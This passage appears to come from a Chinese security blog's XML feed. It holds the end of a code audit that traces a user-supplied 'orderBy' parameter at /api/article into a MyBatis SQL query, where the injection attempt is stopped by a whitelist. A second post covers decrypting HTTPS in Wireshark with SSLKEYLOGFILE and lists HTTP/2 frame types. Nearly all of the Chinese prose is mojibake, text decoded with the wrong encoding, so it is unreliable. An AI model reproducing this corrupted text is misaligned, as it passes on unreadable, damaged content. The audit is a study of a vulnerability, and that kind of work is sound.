alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åˆ°è¿™é‡Œæ³¨å…¥äº†<code>AticleMapper</code>ï¼Œç„¶ååœ¨åœ¨å½“å‰æ–‡ä»¶æœç´¢å“ªé‡Œè°ƒç”¨äº†<code>selectAll</code>æ–¹æ³•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/518c76667202e3f11ddd6ca906bff8e8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå°±æ˜¯æ‰¾å¯¹åº”çš„æ§åˆ¶å™¨<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e1897c2399c77c6629719e39e9d52bf5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¹ˆå¤šï¼Œæ ¹æ®å‘½åçš„è§„åˆ™ï¼Œæˆ‘ä»¬ç›´æ¥è¿›å…¥<code>ArticleController</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1ee837af9def4c318f55e9699ea9b466.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæœç´¢æœ‰æ²¡æœ‰è°ƒç”¨<code>AritcleService.selectAll</code>æ–¹æ³•çš„è¯­å¥ï¼Œä¸€æœï¼Œå•ªï¼Œæ²¡æœ‰å’‹æ•´ï¼Œä¸è¦æ¢ï¼Œåœ¨å›å»<code>ArticleService</code>é‡Œé¢çœ‹çœ‹æœ‰æ²¡æœ‰ç±»æœ¬åœ°çš„è°ƒç”¨<br><img src="https://i-blog.csdnimg.cn/blog_migrate/718dab1f95329a3b947da5e612dda9c8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><code>selectList</code>æ–¹æ³•è°ƒç”¨äº†ï¼Œå†å›åˆ°<code>ArticleController</code>çœ‹çœ‹æœ‰æ²¡æœ‰è°ƒç”¨<code>selectList</code>æ–¹æ³•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/99ef6f21f07c0a3b05bf5d4b44cbbc79.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™å„¿è°ƒç”¨äº†ï¼Œå¯¹åº”çš„è·¯ç”±ä¸º<code>/api/article</code><br>ç„¶åå°±æ˜¯çœ‹å‚æ•°æ˜¯å¦å¯æ§äº†ï¼Œè¿™é‡Œæˆ‘ä¹ˆä½ å¯ä»¥æ§åˆ¶çš„å‚æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯<code>params,queryMap,customsQueryMap</code><br>çœ‹çœ‹è¿™ä¸‰ä¸ªå‚æ•°æ€ä¹ˆæ¥çš„ï¼Œè·Ÿåˆ°å¯¹åº”çš„queryå‡½æ•°<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bbf42a23df56077d010c3608e991ad8e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åœ¨<code>query</code>å‡½æ•°ä¸­ä¸ºä¸Šè¿°ä¸‰ä¸ªå‚æ•°èµ‹å€¼ï¼Œ<code>params</code>æ¥è‡ªå®¢æˆ·ç«¯ä¼ çš„å‚ï¼Œ<code>queryMap</code>ä¸<code>customsMap</code>åŒæ ·æ¥è‡ªäºå®¢æˆ·ç«¯ä¼ çš„å‚ï¼Œä¸è¿‡æœ‰è¦æ±‚ï¼Œå‚æ•°ä¸­å‰ç¼€ä¸º<code>Q_</code>çš„å‚æ•°ä¼šè¢«æ·»åŠ åˆ°<code>queryMap</code>ï¼Œå‰ç¼€ä¸º<code>custom</code>çš„å‚æ•°ä¼šè¢«æ·»åŠ åˆ°<code>customsMap</code>ä¸­ï¼Œç„¶åè°ƒç”¨<code>ArticleListDirective.assemble</code>å¯¹<code>queryMap</code>å‚æ•°è¿›è¡Œå¤„ç†ï¼Œè·Ÿè¿›å»çœ‹çœ‹<br>è¯¥å‡½æ•°å‰é¢éƒ½ä¸é‡è¦ï¼Œç›´åˆ°æœ€åä¸€æ¡è¯­å¥<br><img src="https://i-blog.csdnimg.cn/blog_migrate/714c1936bd2e7b019ab31c6801599133.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œå°±æœ‰å¤„ç†<code>orderBy</code>äº†ï¼Œæ³¨æ„åˆ°æœ‰ä¸€ä¸ªé»˜è®¤å€¼ï¼Œå¦‚æœæä¸å¥½å°±å¾—ä½¿ç”¨è¿™ä¸ªé»˜è®¤å€¼ï¼Œæˆ‘ä»¬å½“ç„¶æ˜¯ä¸æƒ³çš„ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e487e7b309c50c8a857d125af9804d8f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è°ƒç”¨<code>getString</code>å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œç„¶åæŠŠç»“æœæ·»åŠ åˆ°<code>queryMap</code>ä¸­ï¼Œè·Ÿè¿›<code>getString</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/4335735042134ca1845e7eadff1f535b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‡ç‚¹æ¥äº†ï¼Œæ•²é»‘æ¿ï¼Œè¦è€ƒï¼Œæ³¨æ„åˆ°å¦‚æœvalueä¸ºç©ºåˆ™ä½¿ç”¨é»˜è®¤å€¼ï¼Œä¸ä¸ºç©ºåˆ™ä½¿ç”¨ä»paramä¸­è·å–çš„å€¼ï¼Œç®€ç›´çš†å¤§æ¬¢å–œå•Šã€‚ã€‚ã€‚ã€‚<br>è¿™æ—¶å€™æˆ‘ä»¬åªéœ€è¦ä¼ å‚<code>orderBy=xxxx</code>å°±å¯ä»¥æ§åˆ¶valueçš„å€¼äº†ï¼Œç®€ç›´å®Œç¾ï¼Œç„¶åæ¥ç€å¾€ä¸‹èµ°ã€‚æ¥ä¸‹æ¥queryMapä¼šè¢«ä¼ å…¥åˆ°<code>selectList</code>å‡½æ•°<br><img src="https://i-blog.csdnimg.cn/blog_migrate/afb5e6d4b004c18036df1cfa52cb0846.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åä¼ å…¥<code>selectAll</code> ç„¶åmybatisä»queryInfoä¸­è·å–åˆ°orderByçš„å€¼ï¼Œç„¶åæ‹¼æ¥åˆ°sqlè¯­å¥ä¸­ï¼Œæ³¨å…¥å®Œæˆï¼Œäºæ˜¯æˆ‘å°±è¯•äº†ä¸‹ï¼Œç„¶åå°±æŠ¥é”™äº†ã€‚ã€‚ã€‚ã€‚ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ed045dfdeee0302e085577626fa6481.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>å“¦è±ï¼Œç™½åå•ï¼Œå®Œè›‹ã€‚åˆ°è¿™é‡ŒåŸºæœ¬ä¸Šå°±å¤±è´¥äº†ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜è¦å»çœ‹ä¸€çœ‹æ€ä¹ˆæ‹¦çš„ï¼Œè¿™é‡ŒæŠ¥é”™æ³¨æ„åˆ°æ˜¯åœ¨<code>QueryParser</code>è§£æçš„æ—¶å€™é™åˆ¶äº†ç™½åå•ï¼Œæœ€åå®šä½åˆ°è¿™é‡Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/791ada2e53ee84118d82feb21c5eb9b0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›å»<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3768c9c3ce96f2e60702fe9c3fe0c8dd.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç»§ç»­åˆ°parseå‡½æ•°æœ€åä¸€è¡Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4e6fda6669c7b46c6f08dfdf4aebf804.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·Ÿè¿›<code>parseOrderBy</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/99806a2b16e0e7ea3777e19f7029ae2f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»–å¦ˆçš„ï¼Œæˆ‘ä¸€çœ¼å°±æ³¨æ„åˆ°è¿™é‡Œçš„<code>preventInjection</code>ï¼Œè¿›å»çœ‹çœ‹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aa41d49a6862016da9fcd45c4a4784b8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ã€‚ã€‚ã€‚ã€‚æ ¹æºåœ¨è¿™é‡Œ</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»WiresharkæŠ“å–HTTPSæµé‡åˆ°HTTP2åè®®</title>
    <url>/archives/e8476a7d.html</url>
    <content><![CDATA[<h1 id="å¹æ°´"><a href="#å¹æ°´" class="headerlink" title="å¹æ°´"></a>å¹æ°´</h1><p>æ‰“å·¥äººä»Šå¤©æ­£æ— èŠåœ¨å°è“é¸Ÿä¸Šçœ‹çœ‹å›½å¤–çš„å¤§å“¥ä»¬æœ€è¿‘æœ‰æ²¡æœ‰åˆæä»€ä¹ˆå¤§åŠ¨ä½œï¼Œçªç„¶çœ‹åˆ°ä¸€æ¡æ¨æ–‡ä»‹ç»ä½¿ç”¨wiresharkæŠ“å–httpsæŠ¥æ–‡çš„æ–¹æ³•ï¼Œæ­£å¥½å‰æ®µæ—¶é—´ä¹Ÿåœ¨å…¬ä¼—å·çœ‹åˆ°äº†ä¸€ç¯‡æ–‡ç« æ•™è¿™ä¸ªï¼Œå½“æ—¶é…ç½®å¥½äº†ä½†æ²¡æœ‰å»å®é™…éªŒè¯è¿‡å¥½ä½¿ä¸ï¼Œäºæ˜¯è¶ç€ä¸Šç­æ—¶é—´ä¸éªŒè¯ç™½ä¸éªŒè¯ï¼Œæˆ‘è¿™ä¸æ˜¯åˆ’æ°´ï¼Œæˆ‘è¿™æ˜¯åœ¨æ‰“é€ ç”Ÿäº§å·¥å…·ï¼Œä¸ºä¸‹ä¸€æ­¥æå‡ç”Ÿäº§åŠ›æ‰“ä¸‹è‰¯å¥½çš„åŸºç¡€ã€‚<br>é…ç½®å…¶å®ç›¸å¯¹æ¥è¯´è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œé¦–å…ˆæ˜¯éœ€è¦è®¾ç½®ä¸€ä¸‹ç¯å¢ƒå˜é‡å¢åŠ ä¸€é¡¹SSLKEYLOGFILEæŒ‡å‘ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶å°±å¥½äº†ï¼Œè¿™æ ·è°·æ­Œæˆ–è€…ç«ç‹æµè§ˆå™¨åœ¨è¿è¡Œçš„æ—¶å€™å°±ä¼šå°†æ¯æ¬¡httpsä¼šè¯çš„åŠ å¯†ç§˜é’¥å­˜å‚¨åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œç„¶åå†wiresharkä¸­é…ç½®ä¸€ä¸‹TLSåè®®çš„è®¤è¯æ–‡ä»¶ä¹ŸæŒ‡å‘è¿™ä¸ªæ–‡ä»¶å°±okäº†ï¼Œå½“ç„¶è¿™ä¸ªåŸç†æ˜¯æˆ‘è‡ªå·±ç†è§£çš„ï¼Œä¸è¿‡æƒ³æ¥ä¹Ÿå°±å…«ä¹ä¸ç¦»åäº†ã€‚æƒ³è¦çŸ¥é“è¯¦æƒ…çš„å¯ä»¥å‚çœ‹ä¸‹é¢ä¸¤ç¯‡æ–‡ç« å’¯</p>
<blockquote>
<p><a href="https://mp.weixin.qq.com/s/jUFT1iA6Uy7EKJAFkebjDw">https://mp.weixin.qq.com/s/jUFT1iA6Uy7EKJAFkebjDw</a><br><a href="https://twitter.com/binitamshah/status/1511254916484198402?s=20&t=qrF9mz6muHovokRB5nGPkg">https://twitter.com/binitamshah/status/1511254916484198402?s=20&amp;t=qrF9mz6muHovokRB5nGPkg</a></p>
</blockquote>
<span id="more"></span>
<p>æœ€ç»ˆçš„å®ç°æ•ˆæœæ˜¯è¿™æ ·çš„<br><img src="https://i-blog.csdnimg.cn/blog_migrate/da6b1188291a0cb3faaa42a16cb0f24a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åˆ°è¿™é‡Œæˆ‘é™·å…¥äº†ç–‘é—®ï¼Œå¹³æ—¶æˆ‘ä»¬ç”¨burpæŠ“çš„åŒ…éƒ½æ˜¯HTTP1.1ç‰ˆæœ¬çš„ï¼Œæ€ä¹ˆåˆ°äº†wiresharkè¿™é‡Œä¹‹åå°±å˜æˆHTTP2ç‰ˆæœ¬çš„äº†ï¼Œäºæ˜¯æˆ‘ä½¿ç”¨æœ‰é“ç¿»è¯‘åšäº†ä¸ªå®éªŒã€‚é¦–å…ˆä½¿ç”¨BurpæŠ“åŒ…ç„¶åå†å‘åŒ…ä½¿ç”¨wiresharkæŠ“åŒ…ä¹‹åå‘ç°æŠ¥æ–‡è¿˜æ˜¯æ­£å¸¸çš„HTTP1.1ç‰ˆæœ¬çš„ï¼Œåœ¨wiresharkä¸­ä½¿ç”¨HTTP2åè®®è¿‡æ»¤å™¨æ•è·ä¸åˆ°è¿™éƒ¨åˆ†æµé‡ï¼Œå½“æˆ‘ç›´æ¥ä½¿ç”¨æµè§ˆå™¨è®¿é—®æ—¶å´æ˜¯èƒ½åæ­£å¸¸ä½¿ç”¨http2åè®®è¿‡æ»¤å™¨çœ‹åˆ°è¿™äº›æŠ¥æ–‡ï¼Œæ®è¯´æ˜¯æœ‰HTTPåè®®åå•†æœºåˆ¶</p>
<blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1420299">https://cloud.tencent.com/developer/article/1420299</a></p>
</blockquote>
<p>å½“çœ‹åˆ°è¿™ä¸ªwiresharkæŠ“åˆ°çš„httpåè®®æµé‡çš„æ—¶å€™æˆ‘æ¥äº†å…´è¶£ï¼Œäºæ˜¯å»å­¦ä¹ äº†ä¸€ä¸‹HTTP2åè®®çš„çŸ¥è¯†ã€‚<br>HTTP2åè®®ç›¸æ¯”äºHTTP1.1åè®®æœ‰å¾ˆå¤§çš„ä¸åŒï¼Œé¦–å…ˆ2ç‰ˆæœ¬çš„åè®®ä½¿ç”¨çš„æ˜¯å­—èŠ‚æ¥ä¼ è¾“æ•°æ®è€Œä¸æ˜¯æ–‡æœ¬ï¼Œå…¶æ¬¡2ç‰ˆæœ¬çš„åè®®æ˜¯åŒå‘çš„åè®®ï¼Œè¿™ä¸»è¦å¾—ç›ŠäºæœåŠ¡ç«¯æ¨é€æœºåˆ¶ï¼Œç„¶å2ç‰ˆæœ¬çš„åè®®æ˜¯æ²¡æœ‰é˜»å¡ä¸ç­‰å¾…çš„å¯ä»¥å¹¶è¡Œçš„å‘é€å¤šä¸ªè¯·æ±‚ï¼Œå†æœ‰2ç‰ˆæœ¬çš„åè®®ä¸€ä¸ªåŸŸåå°±æ˜¯ä¸€ä¸ªè¿æ¥ï¼Œä¸åƒ1ç‰ˆæœ¬çš„åè®®ä¸€æ¬¡è¯·æ±‚å°±æ˜¯ä¸€æ¬¡æ–°çš„è¿æ¥ï¼Œè¿™æå¤§çš„èŠ‚çº¦äº†èµ„æºï¼Œæé«˜äº†æ•ˆç‡ï¼Œå†æœ‰å°±æ˜¯å¤´éƒ¨å‹ç¼©ç®—æ³•ï¼Œé‰´äº1ç‰ˆæœ¬åè®®æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦å‘é€å¤§é‡çš„é‡å¤çš„å¤´ä¿¡æ¯ï¼Œ2ç‰ˆæœ¬åœ¨è¿™æ–¹é¢è¿›è¡Œäº†ä¼˜åŒ–ã€‚</p>
<h1 id="HTTP2åè®®ç®€ä»‹"><a href="#HTTP2åè®®ç®€ä»‹" class="headerlink" title="HTTP2åè®®ç®€ä»‹"></a>HTTP2åè®®ç®€ä»‹</h1><p>è¯¦æƒ…å¯å‚è€ƒè¿™ç¯‡æ–‡ç« </p>
<blockquote>
<p><a href="https://www.jianshu.com/p/e57ca4fec26f">https://www.jianshu.com/p/e57ca4fec26f</a></p>
</blockquote>
<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>åœ¨HTTP2ä¸­æœ‰å‡ ä¸ªå…³é”®è¯ï¼Œå¸§ã€è¯·æ±‚ã€æµã€è¿æ¥ã€‚ä¸€ä¸ªè¯·æ±‚å°±æ˜¯ä¸€ä¸ªæµï¼Œä¸€ä¸ªæµç”±å¤šä¸ªå¸§ç»„æˆï¼Œä¸€ä¸ªåŸŸåä¸€ä¸ªè¿æ¥ï¼Œä¸€ä¸ªè¿æ¥é‡Œæœ‰å¤šä¸ªè¯·æ±‚ã€‚ä¸åŒæµçš„å¸§æ˜¯å¯ä»¥åŒæ—¶å¹¶å‘è¯·æ±‚çš„ï¼Œä½†æ˜¯åŒä¸€ä¸ªæµä¸­çš„å¸§æ˜¯æœ‰ä¸¥æ ¼çš„é¡ºåºçš„ï¼Œå®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªé¡µé¢å¯èƒ½éœ€è¦å‘é€å¤šæ¬¡è¯·æ±‚ï¼Œåœ¨HTTP2ä¸­å› ä¸ºæœåŠ¡ç«¯æ¨é€çš„å­˜åœ¨å¯ä»¥å‡è½»å®¢æˆ·ç«¯è¯·æ±‚çš„å‹åŠ›ï¼Œåªéœ€ä¸€æ¬¡è¯·æ±‚æœåŠ¡ç«¯å¯ä»¥ä¸»åŠ¨å‘æœåŠ¡ç«¯æ¨é€éœ€è¦çš„é…å¥—èµ„æºï¼Œå½“ç„¶å®¢æˆ·ç«¯å¦‚æœç¼“å­˜æ²¡æœ‰è¿‡æœŸç­‰è¿˜å¯ä»¥æ‹’æ”¶ã€‚<br>HTTP2åè®®çš„å•ç‹¬çš„ä¸€ä¸ªå¸§æœ‰ç»Ÿä¸€çš„æ ¼å¼ã€‚åŒ…æ‹¬å›ºå®š9å­—èŠ‚çš„å¸§å¤´ä»¥åŠè´Ÿè½½ä¹Ÿå°±æ˜¯æ•°æ®éƒ¨åˆ†ã€‚<br>åœ¨å¸§å¤´ä¸­åŒ…æ‹¬å¸§é•¿ï¼ˆ24ï¼‰å¸§ç±»å‹ï¼ˆ8ï¼‰æ ‡å¿—ä½ï¼ˆ8ï¼‰Rï¼ˆ1ä¿ç•™ä½ï¼‰å¸§IDï¼ˆ31ä½ï¼‰<br>å…¶ä¸­æ ‡å¿—ä½çš„æ ¼å¼å–å†³äºå¸§ç±»å‹ã€‚</p>
<h2 id="å¸§ç±»å‹"><a href="#å¸§ç±»å‹" class="headerlink" title="å¸§ç±»å‹"></a>å¸§ç±»å‹</h2><p>å¸§ç±»å‹åŒ…æ‹¬</p>
<table>
<thead>
<tr>
<th>å¸§ç±»å‹</th>
<th>ä¸­æ–‡</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>HEADERS</td>
<td>æŠ¥å¤´å¸§ (type&#x3D;0x1)</td>
<td>ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæµæˆ–è€…æºå¸¦ä¸€ä¸ªé¦–éƒ¨å—ç‰‡æ®µï¼ŒåŸºæœ¬å°±ç›¸å½“äº1.1ç‰ˆæœ¬çš„è¯·æ±‚å¤´éƒ¨åˆ†</td>
</tr>
<tr>
<td>DATA</td>
<td>æ•°æ®å¸§ (type&#x3D;0x0)</td>
<td>è£…å¡«ä¸»ä½“ä¿¡æ¯ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªæˆ–å¤šä¸ª DATA å¸§æ¥è¿”å›ä¸€ä¸ªè¯·æ±‚çš„å“åº”ä¸»ä½“</td>
</tr>
<tr>
<td>PRIORITY</td>
<td>ä¼˜å…ˆçº§å¸§ (type&#x3D;0x2)</td>
<td>æŒ‡å®šå‘é€è€…å»ºè®®çš„æµä¼˜å…ˆçº§ï¼Œå¯ä»¥åœ¨ä»»ä½•æµçŠ¶æ€ä¸‹å‘é€ PRIORITY å¸§ï¼ŒåŒ…æ‹¬ç©ºé—² (idle) å’Œå…³é—­ (closed) çš„æµ</td>
</tr>
<tr>
<td>RST_STREAM</td>
<td>æµç»ˆæ­¢å¸§ (type&#x3D;0x3)</td>
<td>æµç»ˆæ­¢å¸§ (type&#x3D;0x3)ï¼Œç”¨æ¥è¯·æ±‚å–æ¶ˆä¸€ä¸ªæµï¼Œæˆ–è€…è¡¨ç¤ºå‘ç”Ÿäº†ä¸€ä¸ªé”™è¯¯ï¼Œpayload å¸¦æœ‰ä¸€ä¸ª 32 ä½æ— ç¬¦å·æ•´æ•°çš„é”™è¯¯ç  (Error Codes)ï¼Œä¸èƒ½åœ¨å¤„äºç©ºé—² (idle) çŠ¶æ€çš„æµä¸Šå‘é€ RST_STREAM å¸§</td>
</tr>
<tr>
<td>SETTINGS</td>
<td>è®¾ç½®å¸§ (type&#x3D;0x4)</td>
<td>è®¾ç½®æ­¤ è¿æ¥ çš„å‚æ•°ï¼Œä½œç”¨äºæ•´ä¸ªè¿æ¥ï¼Œä¸€èˆ¬æ˜¯ä¸€æ¬¡è¿æ¥çš„ç¬¬ä¸€ä¸ªå¸§ï¼Œå½“ç„¶å‰é¢çš„åè®®å‰è¨€ä¸ç®—çš„è¯</td>
</tr>
<tr>
<td>PUSH_PROMISE</td>
<td>æ¨é€å¸§ (type&#x3D;0x5)</td>
<td>æœåŠ¡ç«¯æ¨é€ï¼Œå®¢æˆ·ç«¯å¯ä»¥è¿”å›ä¸€ä¸ª RST_STREAM å¸§æ¥é€‰æ‹©æ‹’ç»æ¨é€çš„æµ</td>
</tr>
<tr>
<td>PING</td>
<td>PING å¸§ (type&#x3D;0x6)</td>
<td>åˆ¤æ–­ä¸€ä¸ªç©ºé—²çš„è¿æ¥æ˜¯å¦ä»ç„¶å¯ç”¨ï¼Œä¹Ÿå¯ä»¥æµ‹é‡æœ€å°å¾€è¿”æ—¶é—´ (RTT)</td>
</tr>
<tr>
<td>GOAWAY</td>
<td>GOWAY å¸§ (type&#x3D;0x7)</td>
<td>ç”¨äºå‘èµ·å…³é—­è¿æ¥çš„è¯·æ±‚ï¼Œæˆ–è€…è­¦ç¤ºä¸¥é‡é”™è¯¯ã€‚GOAWAY ä¼šåœæ­¢æ¥æ”¶æ–°æµï¼Œå¹¶ä¸”å…³é—­è¿æ¥å‰ä¼šå¤„ç†å®Œå…ˆå‰å»ºç«‹çš„æµ</td>
</tr>
<tr>
<td>WINDOW_UPDATE</td>
<td>çª—å£æ›´æ–°å¸§ (type&#x3D;0x8)</td>
<td>ç”¨äºæ‰§è¡Œæµé‡æ§åˆ¶åŠŸèƒ½ï¼Œå¯ä»¥ä½œç”¨åœ¨å•ç‹¬æŸä¸ªæµä¸Š (æŒ‡å®šå…·ä½“ Stream Identifier) ä¹Ÿå¯ä»¥ä½œç”¨æ•´ä¸ªè¿æ¥ (Stream Identifier ä¸º 0x0)ï¼Œåªæœ‰ DATA å¸§å—æµé‡æ§åˆ¶å½±å“ã€‚åˆå§‹åŒ–æµé‡çª—å£åï¼Œå‘é€å¤šå°‘è´Ÿè½½ï¼Œæµé‡çª—å£å°±å‡å°‘å¤šå°‘ï¼Œå¦‚æœæµé‡çª—å£ä¸è¶³å°±æ— æ³•å‘é€ï¼ŒWINDOW_UPDATE å¸§å¯ä»¥å¢åŠ æµé‡çª—å£å¤§å°</td>
</tr>
<tr>
<td>CONTINUATION</td>
<td>å»¶ç»­å¸§ (type&#x3D;0x9)</td>
<td>ç”¨äºç»§ç»­ä¼ é€é¦–éƒ¨å—ç‰‡æ®µåºåˆ—</td>
</tr>
</tbody></table>
<h2 id="DATAå¸§"><a href="#DATAå¸§" class="headerlink" title="DATAå¸§"></a>DATAå¸§</h2><p>DATAå¸§çš„payloadéƒ¨åˆ†å·²8ä½çš„å¡«å……é•¿åº¦å¼€å¤´ï¼Œç„¶åæ˜¯æ­£å¼çš„æ•°æ®éƒ¨åˆ†ï¼Œæœ€åæ ¹æ®å¡«å……é•¿åº¦å­—æ®µæŒ‡å®šçš„é•¿åº¦åœ¨æœ«å°¾å¡«å……å¯¹åº”æ•°é‡çš„0<br>çœ‹ä¸€ä¸‹å®é™…çš„å¸§<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fbb55e776451089a2079bcc7e3b4523b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°DATAå¸§çš„æ ‡å¿—ä½åˆ†æˆäº†ä¸‰éƒ¨åˆ†åˆ†åˆ«ä¸ºä¿ç•™ä½ã€å¡«å……æ ‡å¿—ã€æ˜¯å¦ä¸ºå½“å‰æµçš„ç»“æŸåŒ…ä¸‰ä¸ªå­—æ®µ</p>
<h2 id="HEADERSå¸§"><a href="#HEADERSå¸§" class="headerlink" title="HEADERSå¸§"></a>HEADERSå¸§</h2><p>åŒæ ·çš„HEADERSå¸§ä¹Ÿæ˜¯ä»¥8ä½å¡«å……é•¿åº¦å­—æ®µå¼€å¤´ï¼Œç„¶åæ˜¯1ä½çš„æµä¾èµ–ç”³æ˜ï¼Œ31ä½çš„ä¾èµ–æµIDã€8ä½çš„ä¼˜å…ˆçº§ã€å‹ç¼©å¤´éƒ¨ã€å¡«å……å€¼<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f400f0bb602346560e078f4bca820ca1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ ‡å¿—ä½åŒ…æ‹¬ä¿ç•™ä½ã€ä¼˜å…ˆçº§æ ‡è¯†ã€å¡«å……æ ‡è¯†ã€æ˜¯å¦ä¸ºå½“å‰æµçš„æœ€åä¸€ä¸ªå¤´éƒ¨åŒ…ã€æ˜¯å¦ä¸ºå½“å‰æµçš„æœ€åä¸€ä¸ªåŒ…</p>
<h2 id="SETTINGS-å¸§"><a href="#SETTINGS-å¸§" class="headerlink" title="SETTINGS å¸§"></a>SETTINGS å¸§</h2><p>SETTINGSå¸§çš„å°±åŒ…æ‹¬ä¸¤éƒ¨åˆ†åˆ†åˆ«ä¸ºè®¾ç½®é¡¹IDä»¥åŠå…¶å€¼<br>è®¾ç½®é¡¹ä¸€èˆ¬åŒ…å«ä¸€ä¸‹é¡¹ç›®</p>
<table>
<thead>
<tr>
<th>è®¾ç½®é¡¹</th>
<th>ID</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td>SETTINGS_HEADER_TABLE_SIZE</td>
<td>0x1</td>
<td>ç”¨äºè§£æ Header block çš„ Header å‹ç¼©è¡¨çš„å¤§å°ï¼Œåˆå§‹å€¼æ˜¯ 4096 å­—èŠ‚</td>
</tr>
<tr>
<td>SETTINGS_ENABLE_PUSH</td>
<td>0x2</td>
<td>å¯ä»¥å…³é—­ Server Pushï¼Œè¯¥å€¼åˆå§‹ä¸º 1ï¼Œè¡¨ç¤ºå…è®¸æœåŠ¡ç«¯æ¨é€åŠŸèƒ½</td>
</tr>
<tr>
<td>SETTINGS_MAX_CONCURRENT_STREAMS</td>
<td>0x3</td>
<td>ä»£è¡¨å‘é€ç«¯å…è®¸æ¥æ”¶ç«¯åˆ›å»ºçš„æœ€å¤§æµæ•°ç›®</td>
</tr>
<tr>
<td>SETTINGS_INITIAL_WINDOW_SIZE</td>
<td>0x4</td>
<td>æŒ‡æ˜å‘é€ç«¯æ‰€æœ‰æµçš„æµé‡æ§åˆ¶çª—å£çš„åˆå§‹å¤§å°ï¼Œä¼šå½±å“æ‰€æœ‰æµï¼Œè¯¥åˆå§‹å€¼æ˜¯ 2^16 - 1(65535) å­—èŠ‚ï¼Œæœ€å¤§å€¼æ˜¯ 2^31 - 1ï¼Œå¦‚æœè¶…å‡ºæœ€å¤§å€¼åˆ™ä¼šè¿”å› FLOW_CONTROL_ERROR</td>
</tr>
<tr>
<td>SETTINGS_MAX_FRAME_SIZE</td>
<td>0x5</td>
<td>æŒ‡æ˜å‘é€ç«¯å…è®¸æ¥æ”¶çš„æœ€å¤§å¸§è´Ÿè½½çš„å­—èŠ‚æ•°ï¼Œåˆå§‹å€¼æ˜¯ 2^14(16384) å­—èŠ‚ï¼Œå¦‚æœè¯¥å€¼ä¸åœ¨åˆå§‹å€¼ (2^14) å’Œæœ€å¤§å€¼ (2^24 - 1) ä¹‹é—´ï¼Œè¿”å› PROTOCOL_ERROR</td>
</tr>
<tr>
<td>SETTINGS_MAX_HEADER_LIST_SIZE</td>
<td>0x6</td>
<td>é€šçŸ¥å¯¹ç«¯ï¼Œå‘é€ç«¯å‡†å¤‡æ¥æ”¶çš„é¦–éƒ¨åˆ—è¡¨å¤§å°çš„æœ€å¤§å­—èŠ‚æ•°ã€‚è¯¥å€¼æ˜¯åŸºäºæœªå‹ç¼©çš„é¦–éƒ¨åŸŸå¤§å°ï¼ŒåŒ…æ‹¬åç§°å’Œå€¼çš„å­—èŠ‚é•¿åº¦ï¼Œå¤–åŠ æ¯ä¸ªé¦–éƒ¨åŸŸçš„ 32 å­—èŠ‚çš„å¼€é”€</td>
</tr>
</tbody></table>
